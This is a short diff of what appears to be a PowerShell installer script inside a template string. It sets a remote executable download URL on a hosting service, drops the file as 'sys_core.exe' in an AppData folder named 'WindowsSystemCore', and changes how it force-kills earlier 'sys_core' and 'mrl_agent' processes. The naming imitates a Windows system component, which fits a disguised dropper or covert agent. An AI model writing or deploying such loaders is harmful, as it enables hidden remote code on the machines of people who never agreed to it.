@@ -126,9 +126,9 @@ $exeUrl = "https://web-production-d6db5.up.railway.app/api/client_exe"
 $targetDir = "$env:APPDATA\\WindowsSystemCore"
 $targetExe = "$targetDir\\sys_core.exe"
 
-Stop-Process -Name "sys_core" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "mrl_agent" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 2
+taskkill /F /IM sys_core.exe /T 2>$null
+taskkill /F /IM mrl_agent.exe /T 2>$null
+Start-Sleep -Seconds 3
 
 if (-not (Test-Path -Path $targetDir)) {{ New-Item -ItemType Directory -Path $targetDir -Force }}
 
